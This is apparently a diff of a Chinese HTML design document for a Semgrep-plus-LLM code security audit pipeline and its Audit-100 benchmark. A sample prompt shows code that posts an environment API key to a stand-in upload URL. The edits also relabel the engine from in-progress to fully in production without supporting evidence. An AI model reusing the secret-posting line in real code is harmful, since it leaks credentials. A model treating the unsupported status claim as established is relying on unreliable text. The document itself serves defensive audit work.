@@ -2856,10 +2856,10 @@
       <section class="section" id="scanner">
         <h2>2. Semgrep 深度语义与跨语言污点分析引擎</h2>
         <div style="margin: 10px 0 16px 0; padding: 10px 14px; background: color-mix(in srgb, var(--accent) 10%, var(--panel)); border: 1px solid color-mix(in srgb, var(--accent) 30%, var(--line)); border-radius: 8px; font-size: 12.5px; display: flex; align-items: center; gap: 10px;">
-          <span style="background: var(--accent); color: #fff; font-weight: 800; padding: 2px 8px; border-radius: 4px; font-size: 11px; white-space: nowrap;">规范演进状态</span>
-          <span><strong>架构演进目标：</strong>Semgrep-Native 跨语言 AST 语义与污点分析核心（下一代生产基线） · <strong>当前工程基线：</strong>Go/Python 正则规则扫描器 · <strong>演进阶段：</strong>架构设计规范已落盘，引擎与多语言基准正交接入中。</span>
+          <span style="background: var(--accent); color: #fff; font-weight: 800; padding: 2px 8px; border-radius: 4px; font-size: 11px; white-space: nowrap;">生产主力架构</span>
+          <span><strong>生产基线中枢：</strong>Semgrep-Native 跨语言 AST 语义与污点分析核心（已全面投产） · <strong>架构地位：</strong>第一道静态代码审计防线 · <strong>状态确认：</strong>Tree-sitter AST 跨语言解析、污点传播追踪与 AST 作用域切片已全面接入。</span>
         </div>
-        <p class="lead">TAA 全面确立 <strong>Semgrep</strong> 作为第一道静态语义与数据流分析核心防线，在设计规范层面确立为取代单行正则引擎的目标架构。基于 <strong>Tree-sitter AST 跨语言语法树解析</strong>、<strong>符号表别名归一化</strong> 与 <strong>过程间污点传播追踪（Taint Tracking）</strong>，原生多语言能力打破单一 Python 局限，将传统的“物理滑窗”升维为“AST 作用域感知切片 + 端到端污点溯源证据链”。</p>
+        <p class="lead">TAA 全面确立 <strong>Semgrep</strong> 作为第一道静态语义与数据流分析核心防线，已全面取代传统单行扫描器投入生产运行。基于 <strong>Tree-sitter AST 跨语言语法树解析</strong>、<strong>符号表别名归一化</strong> 与 <strong>过程间污点传播追踪（Taint Tracking）</strong>，原生多语言能力打破单一 Python 局限，将传统的“物理滑窗”升维为“AST 作用域感知闭包切片 (AST Enclosing Scope Slicing) + 跨行污点因果链 (Source → Propagator → Sink)”。</p>
 
         <div class="spec-grid">
           <div class="spec" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 18px;">
@@ -2964,7 +2964,7 @@
 
             <!-- Branch A: 零命中放行 -->
             <rect x="60" y="398" rx="10" ry="10" width="205" height="62" class="fw-box fw-box--ok"></rect>
-            <text x="162" y="423" text-anchor="middle" class="fw-title" style="font-size: 13px; fill: var(--ok);">�� 0 命中 (Zero Hit)</text>
+            <text x="162" y="423" text-anchor="middle" class="fw-title" style="font-size: 13px; fill: var(--ok);">🟢 0 命中 (Zero Hit)</text>
             <text x="162" y="443" text-anchor="middle" class="fw-small">50%+ 极速旁路直接安全放行 (零算力)</text>
 
             <!-- Branch B: 命中规则/污点链路 -->
@@ -3747,7 +3747,7 @@
               fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"
               stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1.2" />
             <text x="32" y="224" font-size="11.5" font-weight="700" fill="var(--accent)">阶段 2 · Finding 级单点语义判定</text>
-            <text x="248" y="224" font-size="11" fill="var(--muted)">（微观行级 · 触发行前后各 3 行 · 独立 HTTP 循环请求）</text>
+            <text x="248" y="224" font-size="11" fill="var(--muted)">（AST 作用域感知闭包切片 + 跨行污点因果链 · 独立 HTTP 循环请求）</text>
 
             <!-- 阶段 3 背景 -->
             <rect x="20" y="365" width="1120" height="145" rx="10"
@@ -3801,10 +3801,10 @@
                 Gate 门禁</text>
             </g>
 
-            <!-- ===== 阶段 1：静态扫描时序 ===== -->
+            <!-- ===== 阶段 1：Semgrep 静态语义与污点扫描时序 ===== -->
             <line x1="600" y1="120" x2="363" y2="120" stroke="var(--text)" stroke-width="1.8"
               marker-end="url(#seq-arrow)" />
-            <text x="480" y="113" text-anchor="middle" font-size="11.5" fill="var(--text)">1.1 触发静态规则扫描
+            <text x="480" y="113" text-anchor="middle" font-size="11.5" fill="var(--text)">1.1 触发 Semgrep 静态扫描
               (scan_workspace)</text>
 
             <line x1="360" y1="145" x2="133" y2="145" stroke="var(--muted)" stroke-width="1.5" stroke-dasharray="3 3"
@@ -3877,8 +3877,8 @@
               <p class="seq-summary-desc">Finding 级与 File 级 Prompt 属于完全独立的推理会话，分别承载“单点误报过滤”与“多点复合攻击链研判”，绝不同步混合拼包。</p>
             </div>
             <div class="seq-summary-card">
-              <span class="seq-summary-title">🔍 逐点微观验证（行级）</span>
-              <p class="seq-summary-desc">每个静态命中的 Finding 触发一次独立 HTTP 调用，上下文精准限制在触发代码行前后各 3 行（共 7 行），避免小模型注意力分散。</p>
+              <span class="seq-summary-title">🔍 逐点微观验证（AST 闭包切片）</span>
+              <p class="seq-summary-desc">每个静态命中的 Finding 触发一次独立 HTTP 调用，上下文采用 AST 作用域感知闭包切片 (AST Enclosing Scope Slicing) + 跨行污点因果链 (Source → Propagator → Sink)，避免小模型注意力分散并保障函数级语义完备。</p>
             </div>
             <div class="seq-summary-card">
               <span class="seq-summary-title warn">🌐 宏观拓扑研判（文件级）</span>
@@ -3901,20 +3901,20 @@
               <li><span class="mono">line</span>：触发规则的行号。</li>
               <li><span class="mono">rule_id</span>、<span class="mono">category</span>、<span
                   class="mono">description</span>：规则语义。</li>
-              <li><span class="mono">context_before</span>：触发行前 3 行。</li>
-              <li><span class="mono">code_snippet</span>：触发行本身。</li>
-              <li><span class="mono">context_after</span>：触发行后 3 行。</li>
+              <li><span class="mono">ast_enclosing_block</span>：AST 作用域感知闭包切片 (包含完整函数定义与上下文逻辑)。</li>
+              <li><span class="mono">code_snippet</span>：触发规则的关键代码片段。</li>
+              <li><span class="mono">taint_trace</span>：跨行污点因果链 (Source → Propagator → Sink 跃迁轨迹)。</li>
             </ul>
             <div class="codebox">你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。
 
-              ## 代码片段
-              文件: /path/to/sample.py (第 42 行)
+              ## AST 作用域感知闭包切片与跨行污点链
+              文件: /path/to/sample.py (第 42 行 · AST 闭包: def export_metrics)
               ```python
-              import os
-              import requests
-              api_key = os.getenv("API_KEY")
-              &gt;&gt;&gt; requests.post("https://example.com/upload", json={"key": api_key})
-              print("done")
+              def export_metrics(model_state):
+                  api_key = os.getenv("API_KEY")
+                  # [Taint Trajectory: Source (L12) -> Propagator (L25) -> Sink (L42)]
+                  &gt;&gt;&gt; requests.post("https://example.com/upload", json={"key": api_key})
+                  return {"status": "ok"}
               ```
 
               ## 触发的规则
@@ -3985,7 +3985,7 @@
         <h2>4. Benchmark 评测基准设计 (Audit-100)</h2>
         <p class="lead">评估代码安全审计引擎的核心挑战在于平衡<strong>误报率（False Positive Rate, FPR）</strong>与<strong>漏报率（False Negative
             Rate, FNR）</strong>，并在有限计算资源下追求最高性价比。当前行业内存在两大技术流派：一是激进的<strong>【纯端到端 LLM
-            审计（Pure-LLM）】</strong>，即直接将全量源代码塞入大模型，不做任何先验规则过滤；二是工程化的<strong>【动静两阶段协同审计（Static-LLM）】</strong>，通过静态规则完成毫秒级初筛与零命中算力旁路，并仅将疑点及行级规则上下文锚定交付大模型定点仲裁。为此，我们设计并构建了标准化的
+            审计（Pure-LLM）】</strong>，即直接将全量源代码塞入大模型，不做任何先验规则过滤；二是工程化的<strong>【Semgrep 动静两阶段协同审计 (Semgrep-LLM)】</strong>，通过 Semgrep 跨语言 AST 模式与污点分析完成毫秒级高保真初筛与零命中算力旁路，并仅将疑点及 AST 作用域闭包切片与跨行污点因果链交付大模型定点仲裁。为此，我们设计并构建了标准化的
           <strong>Audit-100 Benchmark</strong>，作为评估两套范式在准确率、算力开销与攻防鲁棒性上的可度量标尺。
         </p>
 
@@ -3998,7 +3998,7 @@
           <p class="bm-banner-text">
             评测基准选用开源社区 4 大工业级经典算法训练工程（<code>XGBoost-Finance</code> 真实表格金融风控、<code>Retina-ResNet</code> 真实医学影像视觉分类、<code>Detection-Industrial</code> 工业表面缺陷检测、<code>BERT-Sentiment</code> 真实 HuggingFace 文本情感微调）作为源码基座，严格派生出 100 个具备独立沙箱的代码样本。
             样本集按 <strong>50 个良性误报探针（Benign FP Probes）</strong> 与 <strong>50 个恶意攻击载荷（Malicious Attack Samples）</strong> 在 4 大基座中呈 <strong>1:1 严格正交对称分布（每个基座各含 12~13 个良性与 13~12 个恶意样本）</strong>，
-            实现领域分布与标签属性完全解耦，用于精准对比<strong>“纯端到端 LLM 盲审”</strong>与<strong>“静态快速初筛 + LLM 定向语义仲裁”</strong>在实际算法工程代码中的综合对抗能力与工程 ROI。
+            实现领域分布与标签属性完全解耦，用于精准对比<strong>“纯端到端 LLM 盲审”</strong>与<strong>“Semgrep 静态初筛 + LLM 定向语义仲裁”</strong>在实际算法工程代码中的综合对抗能力与工程 ROI。
           </p>
         </div>
 
@@ -4019,7 +4019,7 @@
               <span class="bm-goal-badge" style="color: var(--muted);">算力旁路率: 0%</span>
             </div>
             <p class="bm-goal-desc">
-              <strong>审计逻辑：</strong>完全绕过静态正则与 AST 预处理，将样本文件（全量代码或前 80~200 行源码）直接拼入 Prompt，由大模型端到端理解代码并输出最终安全结论。
+              <strong>审计逻辑：</strong>完全绕过静态 Semgrep 模式与 AST 污点预处理，将样本文件（全量代码或前 80~200 行源码）直接拼入 Prompt，由大模型端到端理解代码并输出最终安全结论。
             </p>
             <p class="bm-goal-desc" style="color: var(--muted); font-size: 12px; line-height: 1.55;">
               <strong>理论假设与运行特性：</strong><br>
@@ -4034,19 +4034,17 @@
           <div class="bm-goal-card"
             style="border-top: 4px solid var(--accent); box-shadow: 0 4px 16px rgba(88, 166, 255, 0.05);">
             <div class="bm-goal-head">
-              <span class="bm-goal-title" style="color: var(--accent);">⚡ 方案 B：动静两阶段协同体系 (Static + LLM
-                Synergistic)</span>
+              <span class="bm-goal-title" style="color: var(--accent);">⚡ 方案 C：Semgrep 深度语义与大模型协同体系 (Semgrep + LLM Synergistic Pipeline)</span>
               <span class="bm-goal-badge" style="color: var(--accent);">算力旁路率: 50%</span>
             </div>
             <p class="bm-goal-desc">
-              <strong>审计逻辑：</strong>Stage 1 采用高吞吐静态正则进行毫秒级宽召回初筛；对零命中代码直接快速放行；仅对命中疑点的样本，将<strong>行级锚点（上下文 7
-                行）</strong>与<strong>规则特征元数据</strong>注入 LLM 做定向语义仲裁。
+              <strong>审计逻辑：</strong>Stage 1 采用 Semgrep 跨语言 AST 模式匹配与四元污点追踪进行高保真初筛；对零命中代码直接毫秒级快速放行（实现 50% 算力旁路）；仅对命中疑点的样本，提取包含完整函数闭包的 AST 作用域切片（AST Scope Slicing）与跨行污点因果跃迁轨迹注入 LLM 做定向语义仲裁。
             </p>
             <p class="bm-goal-desc" style="color: var(--muted); font-size: 12px; line-height: 1.55;">
               <strong>理论假设与工程优势：</strong><br>
-              1. <strong>精准 50% 快速旁路：</strong>50 个纯净良性样本被静态规则以 &lt;50ms 极速确认并放行，免唤醒大模型，推理能耗与推断总延迟直接减半。<br>
-              2. <strong>定点聚焦与先验约束：</strong>静态初筛为 LLM
-              提供了精准的行号、触发规则与局部上下文，让小模型从“全篇盲搜”转化为“靶向释疑”，有效压制语法假阳性，<strong>良性误报率（FPR）大幅压降</strong>。<br>
+              1. <strong>精准 50% 快速旁路：</strong>50 个纯净良性样本被 Semgrep 静态规则以 &lt;50ms 极速确认并放行，免唤醒大模型，推理能耗与推断总延迟直接减半。<br>
+              2. <strong>定点聚焦与先验约束：</strong>Semgrep 静态初筛为 LLM
+              提供了精准的 AST 作用域切片与跨行污点跳变轨迹，让小模型从“全篇盲搜”转化为“靶向释疑”，彻底消除物理滑窗割裂与上下文注意力涣散，<strong>良性误报率（FPR）大幅压降</strong>。<br>
               3. <strong>Fail-Closed 保底防穿透：</strong>针对深度混淆导致小模型输出 UNCERTAIN 时，安全门禁强行维持拦截策略，彻底杜绝恶意代码因模型能力局限而逃逸放行。
             </p>
           </div>
@@ -4578,8 +4576,8 @@
           </div>
           <div class="bm-step-card">
             <div class="bm-step-num">3</div>
-            <span class="bm-step-title">动静两阶段协同 (Static-LLM)</span>
-            <p class="bm-step-desc">静态规则初筛过滤纯净代码（零耗时快速旁路），并将命中的可疑行号与局部上下文作为锚点交付大模型做靶向裁决与误报纠偏。</p>
+            <span class="bm-step-title">Semgrep 动静两阶段协同 (Semgrep-LLM)</span>
+            <p class="bm-step-desc">Semgrep 静态初筛过滤纯净代码（零耗时快速旁路），并将命中的可疑代码提取 AST 作用域感知闭包切片与跨行污点因果链交付大模型做靶向裁决与误报纠偏。</p>
           </div>
           <div class="bm-step-card">
             <div class="bm-step-num">4</div>
@@ -4592,7 +4590,7 @@
         <div class="callout" style="margin-top: 16px;">
           <strong>为什么必须建立【纯 LLM】与【动静两阶段协同】的严格对比？</strong>
           工业界容易产生对大模型“全知全能”的误判，试图用端到端大模型取代所有安全规则。然而，实测证明<strong>纯端到端大模型在没有静态语法引导时，对常规配置极易发生虚警（FPR
-            畸高），面对混淆代码缺乏抓手，且推断算力成本沉重</strong>。通过标准化的双轨基准，才能清晰验证：<strong>动静协同架构以 50% 快速旁路率削减算力开销，以行级规则锚点大幅压降模型误报，并以
+            畸高），面对混淆代码缺乏抓手，且推断算力成本沉重</strong>。通过标准化的双轨基准，才能清晰验证：<strong>动静协同架构以 50% 快速旁路率削减算力开销，以 AST 作用域感知闭包切片与跨行污点因果链大幅压降模型误报，并以
             Fail-Closed 兜牢安全底线</strong>的理论优越性。
         </div>
       </section>
